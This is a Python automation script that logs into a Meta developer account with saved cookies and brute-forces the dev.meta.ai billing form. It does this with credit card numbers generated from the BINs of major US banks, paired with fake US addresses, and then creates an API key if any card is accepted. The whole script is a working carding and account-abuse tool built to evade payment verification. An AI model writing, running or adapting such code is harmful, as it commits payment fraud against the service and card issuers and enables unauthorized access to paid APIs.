#!/usr/bin/env python3
"""Brute force: try multiple BIN-generated cards from our database."""
import asyncio
import json
import os
import sys
import random
from pathlib import Path
from datetime import datetime

os.environ["DISPLAY"] = ":99"
SCREENSHOTS = Path("/root/meta-register/data/screenshots")
sys.path.insert(0, "/root/meta-register")
from card_gen import generate_card, generate_us_address, _load_bins

async def safe_load(page, timeout=10000):
    try:
        await page.wait_for_load_state("networkidle", timeout=timeout)
    except:
        pass

async def dismiss_modal(page):
    for _ in range(3):
        body = await page.evaluate("document.body?.innerText || ''")
        if "Welcome" not in body:
            return
        els = await page.evaluate("""
            Array.from(document.querySelectorAll('*')).filter(el => {
                return el.innerText?.trim() === 'Continue' && el.offsetParent !== null &&
                       el.getBoundingClientRect().height > 20 && el.getBoundingClientRect().width > 40;
            }).map(el => ({ r: el.getBoundingClientRect() }))
        """)
        if els:
            e = els[0]['r']
            await page.mouse.click(e['x'] + e['width']/2, e['y'] + e['height']/2)
            await asyncio.sleep(2)

async def main():
    from camoufox.async_api import AsyncCamoufox

    with open("/root/meta-register/data/output/accounts_20260714_114223_full.json") as f:
        data = json.load(f)
    account = data[0]
    cookie_dict = account["cookies"]

    cookies = []
    domain_map = {
        "datr": ".auth.meta.com", "fs": ".auth.meta.com", "dbln": ".auth.meta.com",
        "locale": ".auth.meta.com", "ig_did": ".instagram.com", "llm_sess": ".meta.ai",
        "ps_l": ".auth.meta.com", "ps_n": ".auth.meta.com", "wd": ".auth.meta.com",
        "fr": ".facebook.com", "sb": ".facebook.com",
    }
    for name, value in cookie_dict.items():
        cookies.append({"name": name, "value": value, "domain": domain_map.get(name, ".meta.ai"), "path": "/", "secure": True, "httpOnly": False})

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    card_name = f"{account['first_name']} {account['last_name']}"

    # Get major bank BINs
    all_bins = _load_bins("visa", "credit", "US")
    major = ["JPMORGAN CHASE", "CAPITAL ONE", "CITIBANK", "BANK OF AMERICA", "WELLS FARGO", "U.S. BANK"]
    major_bins = [b for b in all_bins if any(bank in (b.get("bank_name", "") or "").upper() for bank in major)]
    test_bins = random.sample(major_bins, min(10, len(major_bins)))
    print(f"Testing {len(test_bins)} BINs from major US banks...")

    async with AsyncCamoufox(headless=False) as browser:
        context = await browser.new_context()
        await context.add_cookies(cookies)
        page = await context.new_page()

        for attempt, bin_info in enumerate(test_bins):
            card = generate_card("visa", bin_info["bin"])
            addr = generate_us_address()
            print(f"\n[{attempt+1}/{len(test_bins)}] BIN: {card['bin']} | Bank: {card['bank']} | Card: {card['formatted']}")

            try:
                await page.goto("https://dev.meta.ai/billing", wait_until="domcontentloaded", timeout=30000)
                await safe_load(page)
                await asyncio.sleep(2)
                await dismiss_modal(page)

                # Open card form
                btn = await page.wait_for_selector('button:has-text("Add payment method")', timeout=5000)
                await btn.click()
                await asyncio.sleep(3)

                # Fill
                fname = await page.query_selector('input[name="firstName"]')
                if fname:
                    await fname.click(); await fname.fill(""); await fname.type(card_name, delay=20)

                cardnum = await page.query_selector('input[name="cardNumber"]')
                if cardnum:
                    await cardnum.click(); await cardnum.fill("")
                    for ch in card["number"]:
                        await page.keyboard.type(ch, delay=30)

                expiry = await page.query_selector('input[name="expiration"]')
                if expiry:
                    await expiry.click(); await asyncio.sleep(0.2)
                    for ch in card["expiry"]:
                        await page.keyboard.type(ch, delay=40)

                cvv = await page.query_selector('input[name="securityCode"]')
                if cvv:
                    await cvv.click(); await asyncio.sleep(0.2)
                    for ch in card["cvv"]:
                        await page.keyboard.type(ch, delay=40)

                postal = await page.query_selector('input[name="postalCode"]')
                if postal:
                    val = await postal.input_value()
                    if not val: await postal.fill(addr["zip"])

                await asyncio.sleep(0.5)

                # Submit
                next_btn = await page.query_selector('button:has-text("Next")')
                if next_btn:
                    disabled = await next_btn.get_attribute("aria-disabled")
                    if disabled == "true":
                        print("  [SKIP] Next disabled"); continue
                    await next_btn.click(force=True)

                    for i in range(10):
                        await asyncio.sleep(1)
                        body = await page.evaluate("document.body?.innerText || ''")
                        if "Couldn't save" in body or "Incorrect" in body:
                            print(f"  ❌ REJECTED")
                            break
                        elif "Card details" not in body:
                            form = await page.query_selector('input[name="cardNumber"]')
                            if not form:
                                print(f"  ✅✅✅ ACCEPTED!")
                                # Create API key
                                await page.goto("https://dev.meta.ai/api-keys", wait_until="domcontentloaded", timeout=30000)
                                await safe_load(page)
                                await asyncio.sleep(2)
                                await dismiss_modal(page)
                                create = await page.query_selector('button:has-text("Create API key")')
                                if create:
                                    await create.click(force=True)
                                    await asyncio.sleep(3)
                                    name_input = await page.query_selector('input[type="text"]')
                                    if name_input:
                                        await name_input.fill("default")
                                        submit = await page.query_selector('button:has-text("Create")')
                                        if submit:
                                            await submit.click(force=True)
                                            await asyncio.sleep(5)
                                body = await page.evaluate("document.body?.innerText || ''")
                                print(f"\nAPI KEY RESULT:\n{body[:2000]}")
                                await page.screenshot(path=str(SCREENSHOTS / f"apikey_{ts}.png"))
                                print("\n[DONE]")
                                return
            except Exception as e:
                print(f"  [ERROR] {e}")
                continue

        print(f"\n{'='*60}")
        print("All cards rejected. Meta validates with issuing bank.")
        print("BIN-generated numbers don't correspond to real accounts.")

asyncio.run(main())
